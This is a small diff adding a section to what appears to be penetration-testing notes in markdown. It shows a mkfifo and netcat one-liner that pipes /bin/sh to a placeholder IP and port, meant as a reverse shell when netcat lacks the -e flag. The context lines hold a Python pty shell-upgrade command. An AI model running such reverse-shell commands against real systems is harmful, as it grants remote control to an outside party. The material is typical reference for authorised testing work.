@@ -10,3 +10,10 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
+## How to obtain reverse shell with 'Neutered' Netcat
+Some versions of netcat do not accept the flag -e. Therefore, the common nc command to send a reverse shell will not work.
+
+```
+mkfifo f;nc <ip> <port> 0<f | /bin/sh -i 2>&1 | tee f
+```
+
